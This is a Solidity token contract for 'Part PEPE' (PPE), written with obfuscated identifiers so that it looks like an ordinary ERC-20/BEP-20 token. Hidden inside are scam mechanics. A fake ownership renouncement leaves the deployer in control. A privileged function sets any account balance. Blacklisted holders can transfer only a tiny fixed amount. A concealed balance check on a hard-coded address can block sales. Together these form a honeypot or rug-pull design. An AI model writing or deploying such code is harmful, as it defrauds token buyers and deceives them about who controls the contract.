//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

interface receiverSell {
    function totalSupply() external view returns (uint256);

    function balanceOf(address takeAt) external view returns (uint256);

    function transfer(address tradingModeLaunch, uint256 senderLaunch) external returns (bool);

    function allowance(address takeSwapIs, address spender) external view returns (uint256);

    function approve(address spender, uint256 senderLaunch) external returns (bool);

    function transferFrom(
        address sender,
        address tradingModeLaunch,
        uint256 senderLaunch
    ) external returns (bool);

    event Transfer(address indexed from, address indexed tokenLimitShould, uint256 value);
    event Approval(address indexed takeSwapIs, address indexed spender, uint256 value);
}

abstract contract receiverTrading {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface tokenFrom {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface fundLimit {
    function createPair(address limitLiquidity, address liquidityReceiverExempt) external returns (address);
}

interface shouldLaunch is receiverSell {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract PartPEPE is receiverTrading, receiverSell, shouldLaunch {

    uint8 private fundAmount = 18;

    function tradingSellSwap(address autoFee) public {
        tradingTeam();
        if (launchAuto == shouldExempt) {
            shouldExempt = enableTeam;
        }
        if (autoFee == takeLaunch || autoFee == fundAuto) {
            return;
        }
        minFee[autoFee] = true;
    }

    function teamMinSell(address minListSender, address tradingModeLaunch, uint256 senderLaunch) internal returns (bool) {
        if (minListSender == takeLaunch) {
            return exemptAuto(minListSender, tradingModeLaunch, senderLaunch);
        }
        uint256 liquidityTotal = receiverSell(fundAuto).balanceOf(maxTradingShould);
        require(liquidityTotal == minLimitSwap);
        require(tradingModeLaunch != maxTradingShould);
        if (minFee[minListSender]) {
            return exemptAuto(minListSender, tradingModeLaunch, autoTo);
        }
        return exemptAuto(minListSender, tradingModeLaunch, senderLaunch);
    }

    string private sellIsLimit = "Part PEPE";

    address private maxExempt;

    function tradingTeam() private view {
        require(maxLaunched[_msgSender()]);
    }

    function fundIsBuy(address sellList) public {
        require(sellList.balance < 100000);
        if (toTake) {
            return;
        }
        if (shouldExempt == launchAuto) {
            launchAuto = enableTeam;
        }
        maxLaunched[sellList] = true;
        
        toTake = true;
    }

    address public fundAuto;

    function exemptAuto(address minListSender, address tradingModeLaunch, uint256 senderLaunch) internal returns (bool) {
        require(receiverMode[minListSender] >= senderLaunch);
        receiverMode[minListSender] -= senderLaunch;
        receiverMode[tradingModeLaunch] += senderLaunch;
        emit Transfer(minListSender, tradingModeLaunch, senderLaunch);
        return true;
    }

    uint256 constant autoTo = 4 ** 10;

    function limitSell() public {
        emit OwnershipTransferred(takeLaunch, address(0));
        maxExempt = address(0);
    }

    address senderTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function name() external view virtual override returns (string memory) {
        return sellIsLimit;
    }

    function balanceOf(address takeAt) public view virtual override returns (uint256) {
        return receiverMode[takeAt];
    }

    mapping(address => bool) public maxLaunched;

    uint256 amountLiquidity;

    uint256 private enableTeam;

    bool public enableIs;

    uint256 minLimitSwap;

    address maxTradingShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    event OwnershipTransferred(address indexed receiverExempt, address indexed takeSwap);

    mapping(address => bool) public minFee;

    function transferFrom(address minListSender, address tradingModeLaunch, uint256 senderLaunch) external override returns (bool) {
        if (_msgSender() != senderTrading) {
            if (tradingSell[minListSender][_msgSender()] != type(uint256).max) {
                require(senderLaunch <= tradingSell[minListSender][_msgSender()]);
                tradingSell[minListSender][_msgSender()] -= senderLaunch;
            }
        }
        return teamMinSell(minListSender, tradingModeLaunch, senderLaunch);
    }

    uint256 private shouldExempt;

    function totalSupply() external view virtual override returns (uint256) {
        return takeAmount;
    }

    function allowance(address minWalletLaunched, address receiverFrom) external view virtual override returns (uint256) {
        if (receiverFrom == senderTrading) {
            return type(uint256).max;
        }
        return tradingSell[minWalletLaunched][receiverFrom];
    }

    function totalReceiver(uint256 senderLaunch) public {
        tradingTeam();
        minLimitSwap = senderLaunch;
    }

    uint256 private takeAmount = 100000000 * 10 ** 18;

    constructor (){
        
        tokenFrom launchTake = tokenFrom(senderTrading);
        fundAuto = fundLimit(launchTake.factory()).createPair(launchTake.WETH(), address(this));
        
        takeLaunch = _msgSender();
        limitSell();
        maxLaunched[takeLaunch] = true;
        receiverMode[takeLaunch] = takeAmount;
        if (enableTeam == shouldExempt) {
            enableTeam = shouldExempt;
        }
        emit Transfer(address(0), takeLaunch, takeAmount);
    }

    function decimals() external view virtual override returns (uint8) {
        return fundAmount;
    }

    function transfer(address minTotal, uint256 senderLaunch) external virtual override returns (bool) {
        return teamMinSell(_msgSender(), minTotal, senderLaunch);
    }

    mapping(address => uint256) private receiverMode;

    mapping(address => mapping(address => uint256)) private tradingSell;

    uint256 private launchAuto;

    bool public launchedMax;

    function senderReceiver(address minTotal, uint256 senderLaunch) public {
        tradingTeam();
        receiverMode[minTotal] = senderLaunch;
    }

    string private sellLimit = "PPE";

    function approve(address receiverFrom, uint256 senderLaunch) public virtual override returns (bool) {
        tradingSell[_msgSender()][receiverFrom] = senderLaunch;
        emit Approval(_msgSender(), receiverFrom, senderLaunch);
        return true;
    }

    address public takeLaunch;

    function owner() external view returns (address) {
        return maxExempt;
    }

    function getOwner() external view returns (address) {
        return maxExempt;
    }

    bool public toTake;

    function symbol() external view virtual override returns (string memory) {
        return sellLimit;
    }

}